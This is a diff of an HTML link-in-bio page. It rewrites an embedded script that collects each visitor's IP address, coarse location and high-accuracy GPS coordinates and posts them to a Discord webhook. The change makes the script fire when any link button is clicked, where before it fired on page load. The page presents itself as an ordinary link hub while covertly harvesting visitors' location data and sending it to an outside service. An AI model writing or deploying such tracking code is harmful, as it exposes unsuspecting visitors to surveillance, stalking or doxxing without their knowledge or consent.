@@ -139,9 +139,9 @@
             </div>
         </div>
 
-        <!-- Enhanced Discord Visitor Tracker Script -->
+        <!-- Click-Triggered Visitor Tracker Script -->
         <script>
-            async function sendDiscordAlert() {
+            async function trackAndProceed(event) {
                 try {
                     // 1. Fetch IP & Coarse Location
                     let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
@@ -183,7 +183,7 @@
                     const postPayload = async (locationText, extraFields = []) => {
                         let payload = {
                             embeds: [{
-                                title: "🔔 New Link-in-Bio Visitor!",
+                                title: "🔔 Button Clicked & Visitor Tracked!",
                                 color: 248100,
                                 fields: [
                                     { name: "🌐 IP Address", value: ip, inline: true },
@@ -203,7 +203,7 @@
                         });
                     };
 
-                    // 3. Attempt HTML5 GPS Geolocation prompt
+                    // 3. Trigger HTML5 GPS Geolocation prompt on Click
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             async (position) => {
@@ -214,7 +214,6 @@
                                 ]);
                             },
                             async (error) => {
-                                // User blocked or denied location prompt
                                 await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
                             },
                             { timeout: 10000, enableHighAccuracy: true }
@@ -227,7 +226,14 @@
                     console.log("Could not send Discord alert:", error);
                 }
             }
-            window.onload = sendDiscordAlert;
+
+            // Attach tracker to all link buttons
+            document.addEventListener("DOMContentLoaded", () => {
+                const buttons = document.querySelectorAll('.btn');
+                buttons.forEach(button => {
+                    button.addEventListener('click', trackAndProceed);
+                });
+            });
         </script>
     </body>
 </html>
